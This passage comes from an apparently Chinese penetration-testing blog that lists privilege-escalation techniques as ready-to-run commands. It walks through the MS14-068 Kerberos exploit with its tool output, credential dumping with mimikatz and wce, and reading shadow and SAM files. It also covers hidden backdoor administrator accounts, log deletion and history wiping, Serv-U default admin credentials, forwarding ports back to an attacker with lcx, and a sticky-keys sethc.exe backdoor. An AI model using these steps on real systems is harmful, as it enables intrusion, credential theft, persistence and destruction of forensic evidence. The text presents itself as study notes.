<p><img src="https://img-blog.csdnimg.cn/20190413165500666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>Win7</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165516801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>win2003</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165521164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>Win7 可以查看域控制器共享出来的文件等资源</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413165527351.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>使用漏洞代码攻击域控制器</p>
<ul>
<li><p>获取攻击文件</p>
<pre><code>  # root@kali:~# searchsploit Ms14-068
      ------------------------------------------ ----------------------------------
       Exploit Title                            |  Path
                                | (/usr/share/                    exploitdb/)
      ------------------------------------------ ----------------------------------
      Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py
      ------------------------------------------ ---------------------------------
  root@kali:~# cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</code></pre></li>
<li><p>域环境下使用通用工具查看本地密码</p>
</li>
</ul>
<pre><code>  C:\fgdump&gt;PwDump.exe localhost    # 仅是本地密码
  C:\&gt;wce-universal.exe    # 结果是域控制器密码
  C:\&gt;wce-universal.exe -w
      Administrator\LAB:jlcssadmin
  C:\Win32&gt;mimikatz.exe
  mimikatz # ::
  mimikatz # privilege::debug
      Privilege &#39;20&#39; OK
  mimikatz # kerberos::list
  mimikatz # sekurlsa::logonPasswords</code></pre><ul>
<li>漏洞利用过程</li>
</ul>
<pre><code>  1. 首先在 kali 通过脚本生成一个票据文件
      # ms14-068.py -u user@lab.com -s userSID -d dc.lab.com
      -u 用户名:登录用户名
      -s userSID
      -d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替
  2. 将票据文件拷贝到 win 系统里
      # 拷贝 TGT_user1@lab.com.ccache 到windows系统
  3. 在 win 系统里使用 mimikatz.exe 完成权限的提升
      # mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit

  # 在 Win7 上使用本地用户登录
  # 查看域账号的信息
  C:\&gt;net user
      \\WIN7-VM 的用户帐户
      Administrator            Guest                    John
      user1                    user2
      命令成功完成。
  C:\Win32&gt;whoami.exe /all
      [User]     = &quot;LAB\user3&quot;  S-1-5-21-3056505427-3800332898-2304591883-1111

  # kali 报错缺少模块
  root@kali:~# python 35474.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132

  # 下载安装模块https://github.com/bidord/pykek
</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<pre><code>     root@kali:~/Desktop/pykek-master# python ms14-068.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132
     Password: 
       [+] Building AS-REQ for 172.16.10.132... Done!
       [+] Sending AS-REQ to 172.16.10.132... Done!
       [+] Receiving AS-REP from 172.16.10.132... Done!
       [+] Parsing AS-REP from 172.16.10.132... Done!
       [+] Building TGS-REQ for 172.16.10.132... Done!
       [+] Sending TGS-REQ to 172.16.10.132... Done!
       [+] Receiving TGS-REP from 172.16.10.132... Done!
       [+] Parsing TGS-REP from 172.16.10.132... Done!
       [+] Creating ccache file &#39;TGT_user1@lab.com.ccache&#39;... Done        
     # 将文件拷贝到 Win7</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>     # 在 Win7 下执行
     C:\mimikatz\Win32&gt;mimikatz.exe log &quot;kerberos::ptc TGT_user3@lab.com.ccache&quot; exit
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)

     # 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket
     C:\mimikatz\Win32&gt;klist
         当前登录 ID 是 0:0x776bd
         缓存的票证: (1)
         #0&gt;     客户端: user3 @ LAB.COM
             服务器: krbtgt/LAB.COM @ LAB.COM
             Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)
             票证标志 0x50a00000 -&gt; forwardable proxiable renewable pre_authent
             开始时间: 3/4/2018 2:00:45 (本地)
             结束时间:   3/4/2018 12:00:44 (本地)
             续订时间: 3/11/2018 2:00:44 (本地)
             会话密钥类型: RSADSI RC4-HMAC(NT)
     C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$
         命令成功完成。</code></pre><h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
<li>与漏洞提权相比更常用的方法 <ul>
<li>企业环境 </li>
<li>补丁更新的全部已经安装 </li>
<li>输入变量过滤之外更值得研发关注的安全隐患 </li>
<li>以system权限启动 </li>
<li>NTFS权限允许users修改删除 </li>
</ul>
</li>
<li>icacls<ul>
<li>icacls c:\windows*.exe /save perm /T </li>
<li>i586-mingw32msvc-gcc -o admin.exe admin.c </li>
</ul>
</li>
<li>Find<ul>
<li>find / -perm 777 -exec ls -l {} ; </li>
</ul>
</li>
<li>应用系统的配置文件 <ul>
<li>应用连接数据库的配置文件 </li>
</ul>
</li>
</ul>
<h5 id="1-NTFS权限允许-users-修改删除"><a href="#1-NTFS权限允许-users-修改删除" class="headerlink" title="1. NTFS权限允许 users 修改删除"></a>1. NTFS权限允许 users 修改删除</h5><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212609.png" alt=""></p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212636.png" alt=""></p>
<ul>
<li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li>
</ul>
<pre><code> C:\&gt;icacls boot.ini
     boot.ini BUILTIN\Power Users:(RX)
              BUILTIN\Administrators:(F)
              NT AUTHORITY\SYSTEM:(F)

     Successfully processed 1 files; Failed processing 0 files
 # 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统

 # 查询各程序的权限情况
 C:\&gt;icacls c:\windows\*.exe /save saveicacls /T
</code></pre><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427213117.png" alt=""></p>
<pre><code> BU：build user
 PU：power user
 BA：build administrator

 如果 BU 是 F 的话，则说明可以替换
 如果出现 FA；；；BU，则说明权限配置不当

 # kali 下使用 c 文件生成 winXP 下的可执行程序
 root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</code></pre><h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><pre><code>root@kali:~# ls -l
find / -perm 777 -exec ls -l {} \;</code></pre><h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><pre><code>1. 应用连接数据库的配置文件
2. 后台服务运行账号</code></pre><h4 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h4><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><pre><code># Linux
•/etc/resolv.conf
•/etc/passwd
•/etc/shadow
•whoami and who –a
•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r
•uname –a, ps aux
•dpkg -l| head

# Windows
•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r
•net view , net view /domain    # 查共享信息
•net user /domain, net user %username% /domain  # 查域信息
•net accounts, net share
•net localgroup administrators username /add
•net group &quot;Domain Controllers&quot; /domain
•net share name$=C:\ /unlimited    # 把 C盘共享出来
•net user username /active:yes /domain  # 域管理员重新启动被锁定账号
</code></pre><h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><pre><code>C:\Users\John&gt;wmic
wmic:root\cli&gt;/?
[global switches] &lt;command&gt;

有效的全局开关有:
/NAMESPACE           别名使用的名称空间路径。
/ROLE                包含此别名定义的角色路径。
/NODE                别名使用的服务器。
/IMPLEVEL            客户模拟级别。
/AUTHLEVEL           客户身份验证级别。
/LOCALE              客户应用的语言识别符。
/PRIVILEGES          启用或禁用所有特权。
/TRACE               将调试信息输出到 stderr。
/RECORD              将所有输入命令和输出写入日志。
/INTERACTIVE         设置或重设交互模式。
/FAILFAST            设置或重置 FailFast 模式。
/USER                会话期间使用的用户。
/PASSWORD            用于会话登录的密码。
/OUTPUT              为输出重新定向指定模式。
/APPEND              为输出重新定向指定模式。
/AGGREGATE           设置或重置集合模式。
/AUTHORITY           Specifies the &lt;authority type&gt; for the connection.
/?[:&lt;BRIEF|FULL&gt;]    用法信息。



•wmic nicconfig get ipaddress,macaddress
•wmic computersystem get username
•wmic netlogin get name,lastlogon
•wmic process get caption, executablepath,commandline   # 提取软件安装信息
•wmic process where name=“calc.exe&quot; call terminate  # 结束进程
•wmic os get name,servicepackmajorversion       #提取操作系统的补丁版本
•wmic product get name,version                  # 提取软件信息
•wmic product where name=“name” call uninstall /nointeractive   # 静默删除
•wmic share get /ALL                            # 提取共享文件夹
•wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where  AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;    # 开远程桌面
•wmic nteventlog get path,filename, writeable   #查看日志目录



C:\&gt;wmic nteventlog get path,filename, writeable
FileName   Path                       Writeable
appevent   \windows\system32\config\  TRUE
ntds       \windows\system32\config\  TRUE
dnsevent   \windows\system32\config\  TRUE
ntfrs      \windows\system32\config\  TRUE
secevent   \windows\system32\config\  TRUE
sysevent   \windows\system32\config\  TRUE
ThinPrint  \windows\system32\config\  TRUE
</code></pre><h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><pre><code># Linux
•/etc ；/usr/local/etc
•/etc/passwd ；/etc/shadow
•.ssh ；.gnupg 公私钥
•The e-mail and data files
•业务数据库 ；身份认证服务器数据库
•/tmp

# windows
•SAM 数据库 ； 注册表文件
•%SYSTEMROOT%\repair\SAM
•%SYSTEMROOT%\System32\config\RegBack\SAM
•业务数据库； 身份认证数据库
•临时文件目录
•UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\
</code></pre><h4 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h4><ul>
<li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li>
<li>windows 系统</li>
</ul>
<pre><code>•禁止在登陆界面显示新建账号
•REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersio\WinLogon\SpecialAccounts\UserList&quot; /v uname /T REG_DWORD /D 0
•del %WINDIR%\*.log /a/s/q/f
•History
•日志
•auth.log / secure
•btmp / wtmp
•lastlog / faillog
•其他日志和 HIDS 等


# 控制系统之后，新建账号并添加管理员组
C:\&gt;net user user4 123456 /add
命令成功完成。
C:\&gt;net localgroup administrators user4 /add
命令成功完成。
# 这样开机登录的界面会显示这个账户
# 可以通过添加注册表来隐藏
REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0
C:\&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0
操作成功结束
# 但是使用 net user 还是可以查看到这个账户


# 强制静默删除日志
C:\&gt;del %WINDIR%\*.log /a/s/q/f</code></pre><ul>
<li>Linux 系统</li>
</ul>
<pre><code>root@kali:~# history
# history 记录保存在 .bash_history
root@kali:~# ls -l .bash_history 
    -rw------- 1 root root 15418 3月   4 00:28 .bash_history
# 擦除痕迹
root@kali:~# history -c

root@kali:~# lsattr
    --------------e---- ./Downloads
    --------------e---- ./Desktop
    --------------e---- ./testDir
    --------------e---- ./Pictures
    --------------e---- ./Public
    --------------e---- ./vmware-tools-patches
    --------------e---- ./Videos
    --------------e---- ./Documents
    --------------e---- ./Music
    --------------e---- ./Templates
root@kali:~# chattr -h
    Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...

# 修改文件属性让其无法被写入数据
root@kali:~# touch 456.txt
root@kali:~# lsattr 456.txt 
    --------------e---- 456.txt
root@kali:~# ifconfig &gt; 456.txt 
root@kali:~# chattr +i 456.txt 
root@kali:~# lsattr 456.txt 
    ----i---------e---- 456.txt
root@kali:~# ifconfig &gt; 456.txt 
    -bash: 456.txt: 不允许的操作

# 修改 .bash_history，让其无法被写入，会变成只读文件
root@kali:~# chattr +i .bash_history


# 日志记录
•auth.log / secure
•btmp / wtmp
•lastlog / faillog

root@kali:~# cat /var/log/auth.log
root@kali:~# cat /var/log/wtmp
root@kali:~# lastlog
    用户名           端口     来自             最后登陆时间
    root             pts/3    172.16.10.1      日 3月  4 02:30:00 -0500 2018
    daemon                                     **从未登录过**
    bin                                        **从未登录过**
    sys                                        **从未登录过**
    sync                                       **从未登录过**
    games                                      **从未登录过**
    man                                        **从未登录过**
    lp                                         **从未登录过**
    mail                                       **从未登录过**
    news                                       **从未登录过**
    uucp                                       **从未登录过**
    proxy                                      **从未登录过**
    www-data                                   **从未登录过**
    backup                                     **从未登录过**
    list                                       **从未登录过**
    irc                                        **从未登录过**
    gnats                                      **从未登录过**
    nobody                                     **从未登录过**</code></pre>]]></content>
      <categories>
        <category>渗透测试学习中常见提权方式总结（一）</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>windows中常见提权方式总结(三)</title>
    <url>/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/</url>
    <content><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul>
<li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li>
<li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li>
<li>serv-u密码文件：ServUDaemon.ini</li>
<li>端口号：默认端口是43958<br>ServUDaemon.ini中lccalsetuportNo=端口</li>
</ul>
<h5 id="FTP提权方法"><a href="#FTP提权方法" class="headerlink" title="FTP提权方法"></a>FTP提权方法</h5><p>1、有修改权限</p>
<p>2、无权限修改</p>
<p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p>
<p>4、serv-u ftp转发端口</p>
<h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p>
<pre><code>[USER=quan|1]                                //用户名
Password=                        //用户密码加密后的密文
HomeDir=c:\ftp\quan             //目录
RelPaths=3 
TimeOut=600                      //超时时间设置
Maintenance=System               //权限
Access1=C:\|RWAMELCDP            //可访问的目录及权限
Access2=d:\|RWAMELCDP            //可访问的目录及权限
Access3=e:\|RWAMELCDP            //可访问的目录及权限
SKEYValues=</code></pre><p>password=2位随机字符+md5(2位随机字符+123456)</p>
<p>4、连接目标FTP服务器</p>
<pre><code>ftp 目标IP地址 刚添加的用户密码</code></pre><p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p>
<pre><code>quote site exec net user quan quan123 /add
quote site exec net localgroup administrators quan /add</code></pre><h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p>
<h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p>
<pre><code>d:\serv_u.exe
d:\serv_u.exe “net user quan quan123 /add”
d:\serv_u.exe “net localgroup administrators quan /add” </code></pre><p>注意命令要有引号</p>
<h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p>
<pre><code>lcx -slave yourIP 5000 127.0.0.1 43958</code></pre><p>在本机上运行</p>
<pre><code>lcx -listen 5000 21</code></pre><p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p>
<p>这里就不写具体过程了</p>
<h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429095652.png" alt=""></p>
<h5 id="G6-FTP简介"><a href="#G6-FTP简介" class="headerlink" title="G6-FTP简介"></a>G6-FTP简介</h5><ul>
<li>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</li>
<li>G6-FTP的默认端口为<code>8021</code>，只侦听在127.0.0.1的8021端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</li>
</ul>
<h5 id="提权关键"><a href="#提权关键" class="headerlink" title="提权关键"></a>提权关键</h5><p>使用lcx时必须保证两个前提，肉鸡A和内网机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。</p>
<h5 id="提取方法"><a href="#提取方法" class="headerlink" title="提取方法"></a>提取方法</h5><p>1、通过执行bat文件提权<br>2、通过映射bat文件提权</p>
<h5 id="通过执行bat文件提权"><a href="#通过执行bat文件提权" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>步骤如下</p>
<ul>
<li><p>下载配置文件<code>Remote.ini</code>，将<code>administrator</code>管理密码解密<br>用cmd5 破解</p>
</li>
<li><p>查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
</li>
<li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p>
</li>
</ul>
<pre><code>lcx.exe -tran 8027 127.0.0.1 8021</code></pre><ul>
<li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p>
</li>
<li><p>创建FTP用户并进行权限设置</p>
</li>
<li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p>
</li>
</ul>
<pre><code>net user quan quan123 /add
net localgroup administrators quan /add</code></pre><ul>
<li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p>
</li>
<li><p>普通用户登录ftp</p>
</li>
<li><p>执行所加入的批处理命令<br>执行命令<code>quote site adduser.bat</code></p>
</li>
</ul>
<h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p>
<pre><code>net user quan quan123 /add
net localgroup administrators quan /add</code></pre><p>5、将a.bat文件映射到新建的site命令</p>
<p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p>
<h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul>
<li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li>
<li>FileZilla的默认端口为<code>14147</code>，只侦听在127.0.0.1的14147端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。默认安装目录下有两个敏感文件<code>filezillaserver.xml</code>（包含用户信息）和<code>filezillaserverinterface.xml</code>（包含管理信息）</li>
</ul>
<h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p>
<p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p>
<p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p>
<pre><code>lcx.exe -tran 14148 127.0.0.1 14147</code></pre><p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p>
<p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p>
<p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p>
<p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p>
<p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p>
<p>9、添加一个用户，并将其提升为管理员权限</p>
<pre><code>net user quan 123 /add
net localgroup administrator quan /add</code></pre><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p>
<p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p>
<h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol>
<li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li>
<li>上传利用到2008启动项 目录里，c:/users/administrator/appdata/roaming/microsoft/windows/start menu/programs/startup/</li>
<li>替换system系统服务程序，进行提权。</li>
</ol>
<h4 id="第三方软件FlashFXP提权"><a href="#第三方软件FlashFXP提权" class="headerlink" title="第三方软件FlashFXP提权"></a>第三方软件FlashFXP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429102747.png" alt=""></p>
<h5 id="1、FlashFXP简介"><a href="#1、FlashFXP简介" class="headerlink" title="1、FlashFXP简介"></a>1、FlashFXP简介</h5><ul>
<li>FlashFXP是一款功能强大的FXP/FTP软件，集成了其它优秀的FTP软件的优点，如CuteFTP的目录比较，支持彩色文字显示；如BpFTP支持多目录选择文件，暂存目录；又如LeapFTP的界面设计。</li>
</ul>
<h5 id="2、提权思路"><a href="#2、提权思路" class="headerlink" title="2、提权思路"></a>2、提权思路</h5><p>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p>
<h5 id="3、提权步骤"><a href="#3、提权步骤" class="headerlink" title="3、提权步骤"></a>3、提权步骤</h5><p>（1）下载quick.dat这个文件<br>链接的账号密码都保存在<code>quick.dat</code><br>falshfxp默认安装目录：C:\Program Files\flashfxp</p>
<p>（2）本地覆盖<br>打开我们本机的FlashFTP把原先的文件替换掉</p>
<p>（3）获取网站管理密码<br>打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息。<br>如果想要获取密码，可下载星号密码查看工具查看暗文</p>
<h4 id="第三方软件pcAnywhere提权"><a href="#第三方软件pcAnywhere提权" class="headerlink" title="第三方软件pcAnywhere提权"></a>第三方软件pcAnywhere提权</h4><h5 id="1、pcAnywhere简介"><a href="#1、pcAnywhere简介" class="headerlink" title="1、pcAnywhere简介"></a>1、pcAnywhere简介</h5><ul>
<li>PcAnywhere是一款远程控制软件，你可以将你的电脑当成主控端去控制远方另一台同样安装有pcANYWHERE的电脑（被控端），你可以使用被控端电脑上的程序或在主控端与被控端之间互传文件。</li>
<li>pcAnywher的默认端口为<code>5631、5632</code>。</li>
<li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li>
</ul>
<p><strong>2、提权步骤</strong></p>
<p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p>
<pre><code>dir *.cif/s</code></pre><p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p>
<p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p>
<h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p>
<h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p>
<h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password</code></pre><p>（2）UltraVNC的注册表路径：</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default\password</code></pre><p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p>
<p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p>
